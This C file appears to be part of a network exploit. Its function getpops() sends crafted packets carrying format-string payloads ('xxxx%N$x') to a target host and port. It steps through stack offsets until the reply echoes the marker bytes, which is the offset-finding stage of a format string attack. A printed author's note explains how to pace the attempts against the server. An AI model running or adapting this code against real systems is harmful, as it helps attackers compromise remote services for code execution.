#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int FMTSIZE ; 
 scalar_t__ malloc (int) ; 
 int /*<<< orphan*/  memcpy (char*,char*,int) ; 
 int /*<<< orphan*/  memset (char*,int,int) ; 
 int /*<<< orphan*/  printe (char*,int) ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 scalar_t__ send_packet (char*,unsigned short,char*,int,int) ; 
 int /*<<< orphan*/  sprintf (char*,char*,...) ; 
 int /*<<< orphan*/  strcmp (char*,char*) ; 
 scalar_t__ strlen (char*) ; 
 int /*<<< orphan*/  usleep (int) ; 

void getpops(char *hostname,unsigned short port){
 unsigned int pops=0;
 char orig[4+1];
 char match[8+1];
 char *buf;
 unsigned char *reply; /* for %d of reply[17]. */
 if(!(buf=(char *)malloc(FMTSIZE+1)))
  printe("getpops(): allocating memory failed",1);
 printf("NOTE: i did not add the command to disconnec"
 "t the user.\nso, you have to wait roughly a minute "
 "before each user\n(format string placed as a user) "
 "times out.  basically,\nwait a minute in-between us"
 "ing it.  also, the packets may\nor may not come bac"
 "k in order. (or come back at all)\n\n");
 printf("[*] finding pop value: %s:%d.\n\n",hostname,
 port);
 while(pops++<255){
  memset(buf,0x0,(FMTSIZE+1));
  memcpy(buf,"\x00\x00\x00\x00\x00\x00\x00\x00\x03\x04"
  ,10);
  /* 37=0x25='%' will get processed as a format. */
  if(pops==37)
   sprintf(buf+10,"xxxx%c%c%%%d$x%cunused%c",pops,
   pops,pops,0x0,0x0);
  else
   sprintf(buf+10,"xxxx%c%%%d$x%cunused%c",pops,
   pops,0x0,0x0);
  reply=(char *)send_packet(hostname,port,buf,
  FMTSIZE,1);
  /* proof of packet reply desired. */
  memset(orig,0x0,4+1);
  sprintf(orig,"%.4s",(reply+13));
  /* want this to be 78787878. (xxxx) */
  memset(match,0x0,8+1);
  sprintf(match,"%.8s",(reply+18));
  /* make sure its the packet desired. */
  if(strlen(match)&&strlen(orig)&&
  !strcmp("xxxx",orig)){
   if(!strcmp("78787878",match)){
    printf("%d:\t(true)\t%s\n",reply[17],match);
    printf("\n[*] the pop value is: %d.\n",pops);
    return;
   }
   else
    printf("%d:\t(false)\t%s\n",reply[17],
    strlen(match)?match:"(no data)");
  }
  usleep(100000); /* pace it. */
 }
 printf("\n[!] pop location find failed.\n");
 return;
}